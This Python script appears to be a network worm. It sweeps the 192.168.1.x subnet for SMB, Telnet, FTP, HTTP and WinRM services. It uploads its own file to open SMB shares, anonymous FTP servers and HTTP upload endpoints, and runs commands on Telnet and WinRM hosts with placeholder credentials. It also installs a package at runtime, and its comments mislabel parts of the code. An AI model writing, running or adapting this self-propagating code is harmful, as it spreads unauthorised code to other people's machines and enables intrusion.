import os
import subprocess
import sys
import socket
import winrm
import requests
from ftplib import FTP
import telnetlib
from orca.braille import Region

def install(package): # Install the required package
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

install('pywinrm') # Install the cryptography package.
from smb.SMBConnection import SMBConnection

#region SMB
def scan_network_for_smb(network_prefix):
    open_smb_hosts = []
    for i in range(1, 255):
        ip = f"{network_prefix}.{i}"
        try:
            conn = SMBConnection('', '', '', '', use_ntlm_v2=True)
            conn.connect(ip, 139, timeout=1)
            open_smb_hosts.append(ip)
            conn.close()
        except:
            pass
    return open_smb_hosts

def upload_script_to_smb(host, script_path):
    try:
        conn = SMBConnection('', '', '', '', use_ntlm_v2=True)
        conn.connect(host, 139, timeout=1)
        with open(script_path, 'rb') as file:
            conn.storeFile('shared', os.path.basename(script_path), file)
        conn.close()
    except Exception as e:
        print(f"Error uploading to {host}: {e}")

network_prefix = "192.168.1"
open_smb_hosts = scan_network_for_smb(network_prefix)
for host in open_smb_hosts:
    upload_script_to_smb(host, __file__)
#endregion
#region TELNET
def scan_network_for_telnet(network_prefix):
    open_telnet_hosts = []
    for i in range(1, 255):
        ip = f"{network_prefix}.{i}"
        try:
            telnet = telnetlib.Telnet(ip, 23, timeout=1)
            open_telnet_hosts.append(ip)
            telnet.close()
        except:
            pass
    return open_telnet_hosts

def execute_command_on_telnet(host, command):
    try:
        telnet = telnetlib.Telnet(host, 23, timeout=1)
        telnet.write(command.encode('ascii') + b"\n")
        telnet.close()
    except Exception as e:
        print(f"Error executing command on {host}: {e}")

network_prefix = "192.168.1"
open_telnet_hosts = scan_network_for_telnet(network_prefix)
for host in open_telnet_hosts:
    execute_command_on_telnet(host, "echo 'Hello from Telnet'")
#endregion
#region FTP
def scan_network_for_ftp(network_prefix):
    open_ftp_hosts = []
    for i in range(1, 255):
        ip = f"{network_prefix}.{i}"
        try:
            ftp = FTP(ip)
            ftp.login()
            open_ftp_hosts.append(ip)
            ftp.quit()
        except:
            pass
    return open_ftp_hosts

def upload_script_to_ftp(host, script_path):
    try:
        ftp = FTP(host)
        ftp.login()
        with open(script_path, 'rb') as file:
            ftp.storbinary(f'STOR {os.path.basename(script_path)}', file)
        ftp.quit()
    except Exception as e:
        print(f"Error uploading to {host}: {e}")

network_prefix = "192.168.1"
open_ftp_hosts = scan_network_for_ftp(network_prefix)
for host in open_ftp_hosts:
    upload_script_to_ftp(host, __file__)
#endregion
#region HTTP/S
def scan_network_for_http(network_prefix):
    open_http_hosts = []
    for i in range(1, 255):
        ip = f"{network_prefix}.{i}"
        try:
            response = requests.get(f"http://{ip}", timeout=1)
            if response.status_code == 200:
                open_http_hosts.append(ip)
        except:
            pass
    return open_http_hosts

def upload_script_to_http(host, script_path):
    try:
        with open(script_path, 'rb') as file:
            files = {'file': file}
            response = requests.post(f"http://{host}/upload", files=files)
            if response.status_code == 200:
                print(f"Successfully uploaded to {host}")
    except Exception as e:
        print(f"Error uploading to {host}: {e}")

network_prefix = "192.168.1"
open_http_hosts = scan_network_for_http(network_prefix)
for host in open_http_hosts:
    upload_script_to_http(host, __file__)
#endregion
#region RDP
def scan_network_for_rdp(network_prefix):
    open_rdp_hosts = []
    for i in range(1, 255):
        ip = f"{network_prefix}.{i}"
        try:
            session = winrm.Session(f'http://{ip}:5985/wsman', auth=('username', 'password'))
            open_rdp_hosts.append(ip)
        except:
            pass
    return open_rdp_hosts

def execute_command_on_rdp(host, command):
    try:
        session = winrm.Session(f'http://{host}:5985/wsman', auth=('username', 'password'))
        result = session.run_cmd(command)
        print(result.std_out.decode())
    except Exception as e:
        print(f"Error executing command on {host}: {e}")

network_prefix = "192.168.1"
open_rdp_hosts = scan_network_for_rdp(network_prefix)
for host in open_rdp_hosts:
    execute_command_on_rdp(host, "echo 'Hello from RDP'")
#endregion